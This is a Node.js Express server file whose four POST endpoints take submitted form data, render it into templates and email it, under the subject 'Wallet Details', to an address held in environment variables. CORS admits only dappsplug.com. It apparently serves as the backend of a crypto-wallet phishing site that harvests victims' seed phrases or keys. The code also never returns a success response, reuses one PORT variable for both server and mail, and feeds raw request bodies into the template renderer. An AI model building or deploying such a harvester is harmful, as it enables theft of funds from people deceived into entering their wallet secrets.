const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const ejs = require('ejs');

const app = express();

const PORT = process.env.PORT || 3009;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(
	cors({
		origin: [
			'https://dappsplug.com',
			'https://dappsplug.com/done',
			'http://dappsplug.com',
			'http://dappsplug.com/done',
		],
	})
);

let transporter = nodemailer.createTransport({
	host: process.env.HOST,
	port: process.env.PORT,
	secure: process.env.SECURE,
	auth: {
		user: process.env.USER, // generated ethereal user
		pass: process.env.PASS, // generated ethereal password
	},
});

app.post('/fd', (req, res) => {
	ejs.renderFile(`${__dirname}/fd1.ejs`, req.body, (err, data) => {
		if (err) {
			return res.status(400).json({ err: 'An error occurred' });
		} else {
			let mailOptions = {
				from: process.env.FROM,
				to: process.env.TO,
				subject: 'Wallet Details',
				html: data,
			};

			transporter.sendMail(mailOptions, (err, res) => {
				if (err) {
					console.log('err', err);
				} else {
					console.log('sent');
				}
			});
		}
	});
});

app.post('/fd1', (req, res) => {
	console.log('req.body', req.body.data);

	ejs.renderFile(`${__dirname}/fd2.ejs`, req.body, (err, data) => {
		if (err) {
			console.log('err', err);
			return res.status(400).json({ err: 'An error occurred' });
		} else {
			let mailOptions = {
				from: process.env.FROM,
				to: process.env.TO,
				subject: 'Wallet Details',
				html: data,
			};

			transporter.sendMail(mailOptions, (err, res) => {
				if (err) {
					console.log('err', err);
				} else {
					console.log('sent');
				}
			});
		}
	});
});

app.post('/fd2', (req, res) => {
	console.log('req.body', req.body.data);

	ejs.renderFile(`${__dirname}/fd3.ejs`, req.body, (err, data) => {
		if (err) {
			console.log('err', err);
			return res.status(400).json({ err: 'An error occurred' });
		} else {
			let mailOptions = {
				from: process.env.FROM,
				to: process.env.TO,
				subject: 'Wallet Details',
				html: data,
			};

			transporter.sendMail(mailOptions, (err, res) => {
				if (err) {
					console.log('err', err);
				} else {
					console.log('sent');
				}
			});
		}
	});
});

app.post('/fd3', (req, res) => {
	console.log('req.body', req.body.data);

	ejs.renderFile(`${__dirname}/fd4.ejs`, req.body, (err, data) => {
		if (err) {
			console.log('err', err);
			return res.status(400).json({ err: 'An error occurred' });
		} else {
			let mailOptions = {
				from: process.env.FROM,
				to: process.env.TO,
				subject: 'Wallet Details',
				html: data,
			};

			transporter.sendMail(mailOptions, (err, res) => {
				if (err) {
					console.log('err', err);
				} else {
					console.log('sent');
				}
			});
		}
	});
});

app.listen(PORT);
